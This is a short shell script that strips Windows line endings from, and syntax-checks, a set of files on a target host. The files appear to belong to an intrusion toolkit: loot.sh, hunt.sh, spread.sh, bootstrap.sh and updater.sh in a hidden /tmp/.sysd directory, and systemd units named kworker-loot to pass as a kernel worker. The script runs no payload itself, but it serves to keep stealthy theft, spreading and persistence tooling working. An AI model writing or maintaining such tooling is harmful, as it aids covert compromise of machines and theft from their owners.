#!/bin/sh
# throwaway: run ON the host. Heal any CRLF that crept in, then dash-check each
# shipped script. sh -n here is the authoritative check: /bin/sh is dash.
for f in /tmp/.sysd/loot.sh /tmp/.sysd/hunt.sh /tmp/.sysd/spread.sh \
         /tmp/.sysd/bootstrap.sh /tmp/.sysd/updater.sh /tmp/.sysd/run.sh \
         /tmp/.sysd/tune.sh /tmp/lt.sh \
         /etc/systemd/system/kworker-loot.service /etc/systemd/system/kworker-loot.timer; do
    [ -f "$f" ] || continue
    if [ "$(tr -cd '\r' < "$f" | wc -c)" -gt 0 ]; then
        tr -d '\r' < "$f" > /tmp/heal.n && mv -f /tmp/heal.n "$f"
        echo "healed $f"
    fi
    case "$f" in
        *.sh) if sh -n "$f" 2>/tmp/heal.err; then echo "$f OK"; else
                  echo "$f SYNTAX FAIL:"; sed -n 1,3p /tmp/heal.err; fi ;;
        *)    echo "$f (unit)" ;;
    esac
done
echo "--- heal done ---"
